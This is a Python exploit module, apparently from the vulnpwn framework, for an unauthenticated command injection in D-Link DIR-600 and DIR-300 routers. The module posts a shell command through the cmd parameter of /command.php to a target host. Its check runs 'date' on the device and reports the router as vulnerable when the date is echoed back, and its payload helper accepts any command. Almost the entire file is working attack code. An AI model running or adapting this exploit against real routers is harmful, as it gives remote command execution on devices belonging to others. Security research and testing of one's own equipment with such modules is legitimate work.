#!/usr/bin/python
# -*-  coding: utf-8 -*-

##
# Current source: https://github.com/open-security/vulnpwn/
##

from lib.core import exploit
import requests


class Module(exploit.Exploit):

    __info__ = {
        'name': "Multiple Vulnerabilities in D'Link DIR-600 and DIR-300",
        'author': ['Open-Security'],
        'description': """
            The vulnerability is caused by missing access restrictions and
            missing input validation in the cmd parameter and can be exploited
            to inject and execute arbitrary shell commands.
        """,
        'references': ['http://www.s3cur1ty.de/m1adv2013-003'],
        'license': 'APACHE_LICENSE',
        'disclosureDate': 'May 07 2013',
        'options': {
            'RHOST': ['192.168.1.1', 'the target host'],
            'RPORT': [80, 'the target port'],
            'TARGETURI': ['/command.php', 'target uri to request']
        }
    }

    def __init__(self):
        exploit.Exploit.__init__(self)

    def generate_rce_payload(self, code):
        return 'cmd=%s' % code

    def check(self):
        cmd = 'date +%Y%m%d'
        uri = 'http://%s:%s%s' % (self.options['RHOST']['value'],
                                  self.options['RPORT']['value'],
                                  self.options['TARGETURI']['value'])

        self.output('Exploiting - %s' % uri)
        headers = {'User-Agent': 'Mozilla/5.0 Gecko/20100101 Firefox/24.0',
                   'Content-Type': 'application/x-www-form-urlencoded'}
        sess = requests.Session()
        resp = sess.post(uri, headers=headers,
                         data=self.generate_rce_payload(cmd))
        if resp and resp.status_code == 200 and resp.text:
            date = resp.text.strip()
            if len(date) == 8 and date.isdigit():
                self.output('Target is vulnable')

    def main(self, *args, **kwargs):
        self.check()
